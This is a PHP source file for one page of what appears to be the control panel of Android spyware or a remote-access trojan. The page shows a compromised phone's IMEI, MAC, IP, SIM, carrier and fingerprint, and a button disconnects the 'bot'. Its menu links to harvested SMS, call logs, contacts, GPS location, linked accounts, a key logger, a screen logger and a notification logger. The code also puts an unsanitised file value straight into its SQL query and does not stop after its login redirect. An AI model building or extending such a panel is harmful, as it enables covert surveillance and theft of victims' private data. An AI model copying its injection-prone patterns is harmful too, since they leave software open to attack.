<?php

session_start();

if ( isset( $_SESSION['user_id'] ) ) {

} else {
	       header("Location: ../index.php");

}
?>
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<title>Control Panel</title>

	<!-- Normalize V8.0.1 -->
	<link rel="stylesheet" href="../css/normalize.css">

	<!-- Bootstrap V4.3 -->
	<link rel="stylesheet" href="../css/bootstrap.min.css">

	<!-- Bootstrap Material Design V4.0 -->
	<link rel="stylesheet" href="../css/bootstrap-material-design.min.css">

	<!-- Font Awesome V5.9.0 -->
	<link rel="stylesheet" href="../css/all.css">

	<!-- Sweet Alerts V8.13.0 CSS file -->
	<link rel="stylesheet" href="../css/sweetalert2.min.css">

	<!-- Sweet Alert V8.13.0 JS file-->
	<script src="../js/sweetalert2.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<link rel="stylesheet" href="../css/jquery.mCustomScrollbar.css">
	
	<!-- General Styles -->
	<link rel="stylesheet" href="../css/style.css">


</head>
<body>
<style>
.example_c {
color: #fffff !important;
text-transform: uppercase;
text-decoration: none;
background: #f0134d;
padding: 8px;
border: 2px solid #f0134d !important;
display: inline-block;
transition: all 0.4s ease 0s;
}
.example_c:hover {
color: #ffffff !important;
background: #fa697c;
border-color: #f0134d !important;
transition: all 0.4s ease 0s;
}

#snackbar {
  visibility: hidden;
  min-width: 250px;
  margin-left: -125px;
  background-color: #f34573;
  color: #fff;
  text-align: center;
  border-radius: 2px;
  padding: 14px;
  position: fixed;
  z-index: 1;
  left: 50%;
  bottom: 30px;
  font-size: 17px;
}

#snackbar.show {
  visibility: visible;
  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
  animation: fadein 0.5s, fadeout 0.5s 2.5s;
}

@-webkit-keyframes fadein {
  from {bottom: 0; opacity: 0;} 
  to {bottom: 30px; opacity: 1;}
}

@keyframes fadein {
  from {bottom: 0; opacity: 0;}
  to {bottom: 30px; opacity: 1;}
}

@-webkit-keyframes fadeout {
  from {bottom: 30px; opacity: 1;} 
  to {bottom: 0; opacity: 0;}
}

@keyframes fadeout {
  from {bottom: 30px; opacity: 1;}
  to {bottom: 0; opacity: 0;}
}
</style>

	
	<!-- Main container -->
	<main class="full-box main-container">
		<!-- Nav lateral -->
		<section class="full-box nav-lateral">
			<div class="full-box nav-lateral-bg show-nav-lateral"></div>
			<div class="full-box nav-lateral-content">
				<nav class="full-box nav-lateral-menu">
					<ul>
						<li>
							<a href="home.php"><i class="fab fa-dashcube fa-fw"></i> &nbsp; Dashboard</a>
						</li>
						</ul>
						</nav>
				<div class="full-box nav-lateral-bar"></div>
				<nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-radiation-alt"></i> &nbsp; Miscellaneous <i class="fas fa-chevron-down"></i></a>
							<ul>
							
								<li><a href="../zathura/Devinfo.php"><i class="fas fa-mobile-alt fa-fw"></i> &nbsp; Device Info</a></li>
								<li><a href="inboxsms.php"><i class="fas fa-boxes fa-inbox"></i> &nbsp; Inbox Messages</a></li>
								<li><a href="calogs.php"><i class="fas fa-phone-square-alt fa-fw"></i> &nbsp; Call Logs</a></li>
								<li><a href="contacts.php"><i class="fas fa-id-badge fa-fw"></i> &nbsp; Contacts</a></li>
								<li><a href="gps.php"><i class="fas fa-map fa-fw"></i> &nbsp; GPS</a></li>
							   <li><a href="accounts.php"><i class="fas fa-user-alt"></i> &nbsp; Linked Accounts </a></li>


								
							</ul>
						</li>
						<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-subscript fa-fw"></i> &nbsp; Loggers <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/screenlog.php"><i class="fas fa-desktop fa-fw"></i> &nbsp; Screen Logger</a></li>
								<li><a href="../zathura/snapshot.php"><i class="fas fa-expand fa-fw"></i> &nbsp; SnapShots</a></li>
								<li><a href="keystrokes.php"><i class="fab fa-twitch"></i> &nbsp; Key Logger</a></li>
								<li><a href="../zathura/notifications.php"><i class="fas fa-align-left fa-fw"></i> &nbsp; Notification Logger</a></li>

							</ul>
						</li>
						
						<li>
						   <a href="../zathura/rogue.php"><i class="fab fa-battle-net"></i></i> &nbsp; Rogue</a>

							<ul>

							</ul>
						</li>
						<li>
						   <a href="../zathura/toggle.php"><i class="fas fa-bolt"></i> &nbsp; Toggle</a>

							<ul>


							</ul>
						</li>

						
                      
                        <li>
							<a href="#" class="nav-btn-submenu"><i class="fab fa-gitkraken fa-fw"></i> &nbsp; Command <i class="fas fa-chevron-down"></i></a>
							<ul>

							<li><a href="../zathura/status.php"><i class="fab fa-hubspot fa-fw"></i> &nbsp; Status</a></li>
								<li><a href="../zathura/history.php"><i class="fab fa-buffer fa-fw"></i> &nbsp; History</a></li>
								
						
							</ul>
				</nav>
			</div>
		</section>

		<!-- Page content -->
		<section class="full-box page-content">
			<nav class="full-box navbar-info">
				
				<a href="#" class="btn-exit-system"><i class="fas fa-power-off"></i></a>
			</nav>

			<!-- Page header -->
			<div class="full-box page-header">
				<h3 class="text-left">
				<i class="fas fa-biohazard"></i> &nbsp; ROGUE
				</h3>
				
			</div>

			<div class="container-fluid">
				<ul class="full-box list-unstyled page-nav-tabs">
					<li>
					<?php
									    $content =  file_get_contents("../config.txt");

										?>
										<script type="text/javascript">
                               var meow = "<?php echo $content; ?>";
                                      </script>

						 <a  style="color: #ffffff" class="fas fa-desktop" href="home.php" align="center" onclick="goclear(meow)"> &nbsp; Device Information </a>


					
					
					</li>
						                <div id="snackbar">BOT KICKED OUT </div>

				</ul>	
			</div>
			 
			 
	<?php 
 
//$id = $_GET["code"];
  $content =  file_get_contents("../config.txt");


 //database constants
include 'DatabaseConfig.php' ;
 
 $conn = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);
 
 //Checking if any error occured while connecting
 if (mysqli_connect_errno()) {
 echo "Failed to connect to MySQL: " . mysqli_connect_error();
 die();
 }
 
 //creating a query
 $provider="";
 $phone="";
 $imei="";
 $ip="";

  $stmt = $conn->prepare("SELECT clm_device_imei,clm_device_bootloader,clm_device_display,
  clm_device_user,clm_device_sdk,
  clm_device_device,clm_device_version,clm_device_cpu,clm_device_sim
  ,clm_device_carrier,clm_device_id,clm_device_cpuu,clm_device_product,clm_device_brand,clm_device_hardware,clm_device_mac,clm_device_ip,clm_device_inc
  ,clm_device_host,clm_device_finger,clm_device_radio,clm_device_man,clm_device_board,clm_device_time
   FROM tbl_device_details WHERE clm_device_imei = $content" ); 
 //executing the query 
 $stmt->execute();
 
 //binding results to the query 
$stmt->bind_result($clm_device_imei,$clm_device_bootloader,$clm_device_display,
 $clm_device_user,$clm_device_sdk,$clm_device_device,
 $clm_device_version,$clm_device_cpu,$clm_device_sim
  ,$clm_device_carrier,$clm_device_id,$clm_device_cpuu,$clm_device_product,$clm_device_brand,$clm_device_hardware,$clm_device_mac,$clm_device_ip,$clm_device_inc
  ,$clm_device_host,$clm_device_finger,$clm_device_radio,$clm_device_man,$clm_device_board,$clm_device_time);
  
 $products = array(); 
 
 //traversing through all the result 
 while($stmt->fetch()){
 $temp = array();
 $temp['imei'] = $clm_device_imei; 
 $temp['bootloader'] = $clm_device_bootloader; 
 $temp['display'] = $clm_device_display; 
$temp['user'] = $clm_device_user; 
 $temp['sdk'] = $clm_device_sdk; 
 $temp['device'] = $clm_device_device; 
 $temp['version'] = $clm_device_version; 
 $temp['cpu'] = $clm_device_cpu; 
 $temp['sim'] = $clm_device_sim; 
 $temp['carrier'] = $clm_device_carrier; 
 $temp['id'] = $clm_device_id;
 $temp['cpu'] = $clm_device_cpuu; 
 $temp['brand'] = $clm_device_brand; 
 $temp['hardware'] = $clm_device_hardware; 
 $temp['product'] = $clm_device_product; 
 $temp['mac'] = $clm_device_mac; 
 $temp['ip'] = $clm_device_ip; 
 $temp['inc'] = $clm_device_inc; 
 $temp['host'] = $clm_device_host; 
 $temp['finger'] = $clm_device_finger; 
 $temp['radio'] = $clm_device_radio; 
 $temp['man'] = $clm_device_man; 
 $temp['board'] = $clm_device_board; 
 $temp['time'] = $clm_device_time; 


 }
 ?>
 
			<!-- Content here-->
			<div class="container-fluid">
				<form action="" class="form-neon" autocomplete="off">
					<fieldset>
						<div class="container-fluid">
							<div class="row">
								<div class="col-12 col-md-6">
									<div class="form-group">
									<br>

								   <legend><i class="fas fa-barcode"></i> &nbsp;  IMEI ADDRESS : <?php  echo $clm_device_imei; ?></legend>
								   <legend><i class="fas fa-hdd"></i> &nbsp;  Bootloader : <?php  echo $clm_device_bootloader; ?></legend>
								   <legend><i class="fab fa-accusoft"></i> &nbsp;  Display : <?php  echo $clm_device_display; ?></legend>
								   <legend><i class="fas fa-user"></i> &nbsp;  User : <?php  echo $clm_device_user; ?></legend>
								   <legend><i class="fab fa-uikit"></i> &nbsp;  SDK : <?php  echo $clm_device_sdk; ?></legend>
								   <legend><i class="fas fa-mobile"></i> &nbsp;  Device : <?php  echo $clm_device_device; ?></legend>
								   <legend><i class="fab fa-android"></i> &nbsp;  Version : <?php  echo $clm_device_version; ?></legend>
								   <legend><i class="fas fa-microchip"></i> &nbsp;  CPU : <?php  echo $clm_device_cpu; ?></legend>
								   <legend><i class="fas fa-sim-card"></i> &nbsp;  Device SIM : <?php  echo $clm_device_sim; ?></legend>
								   <legend><i class="fas fa-broadcast-tower"></i> &nbsp;  Carrier : <?php  echo $clm_device_carrier; ?></legend>
								   <legend><i class="fas fa-expand"></i> &nbsp;  Device ID : <?php  echo $clm_device_id; ?></legend>
								   <legend><i class="fas fa-memory"></i> &nbsp;  CPU2 : <?php  echo $clm_device_cpuu; ?></legend>
								   <legend><i class="fab fa-nimblr"></i>&nbsp;  Product : <?php  echo $clm_device_product; ?></legend>
								   <legend><i class="fab fa-bandcamp"></i> &nbsp;  Brand : <?php  echo $clm_device_brand; ?></legend>
								   <legend><i class="fas fa-server"></i> &nbsp;  Device Hardware : <?php  echo $clm_device_hardware; ?></legend>
								   <legend><i class="fas fa-ethernet"></i> &nbsp;  MAC ADDRESS : <?php  echo $clm_device_mac; ?></legend>
								   <legend><i class="fas fa-globe"></i> &nbsp;  IP ADDRESS : <?php  echo $clm_device_ip; ?></legend>
								   <legend><i class="fab fa-cloudsmith"></i> &nbsp;  Incremental : <?php  echo $clm_device_inc; ?></legend>
								   <legend><i class="fas fa-network-wired"></i> &nbsp;  Host Address : <?php  echo $clm_device_host; ?></legend>
								   <legend><i class="fas fa-fingerprint"></i> &nbsp;  Fingerprint : <?php  echo $clm_device_finger; ?></legend>
								   <legend><i class="fab fa-sith"></i> &nbsp;  Radio : <?php  echo $clm_device_radio; ?></legend>
								   <legend><i class="fas fa-industry"></i> &nbsp;  Device Manufacturer : <?php  echo $clm_device_man; ?></legend>
								   <legend><i class="fas fa-bars"></i> &nbsp;  Board : <?php  echo $clm_device_board; ?></legend>
								   <legend><i class="fas fa-globe-americas"></i> &nbsp;  TimeZone : <?php  echo $clm_device_time; ?></legend>

									</div>
								</div>
								
					
				</form>
				
			</div>	
 
           
		</section>

 

		<!-- Help Modal -->
		<div class="modal fade" id="ModalHelp" tabindex="-1" role="dialog" aria-labelledby="ModalHelpTitle" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title roboto-medium text-center" id="exampleModalLongTitle">Modal title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
				
				<div class="modal-footer">
					<button type="button" class="btn btn-light roboto-condensed-regular" data-dismiss="modal">Close</button>
					&nbsp;
					<button type="button" class="btn btn-light roboto-condensed-regular">Save changes</button>
				</div>
				</div>
			</div>
		</div>
	</main>
	
	
	<!--=============================================
	=            Include JavaScript files           =
	==============================================-->
	<!-- jQuery V3.4.1 -->
	<script src="../js/jquery-3.4.1.min.js" ></script>

	<!-- popper -->
	<script src="../js/popper.min.js" ></script>

	<!-- Bootstrap V4.3 -->
	<script src="../js/bootstrap.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<script src="../js/jquery.mCustomScrollbar.concat.min.js" ></script>

	<!-- Bootstrap Material Design V4.0 -->
	<script src="../js/bootstrap-material-design.min.js" ></script>
	<script>$(document).ready(function() { $('body').bootstrapMaterialDesign(); });</script>

	<script src="../js/main.js" ></script>
	
	<script type="text/javascript">
	
							  function goclear(imei) 
							  {
								  

								   var x = document.getElementById("snackbar");
                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
                                 
								   $.post('disconnect.php', { text: imei, function(data) { 
                                   console.log(data); 
                                   }});
                                  
								 }


</script>
</body>
</html>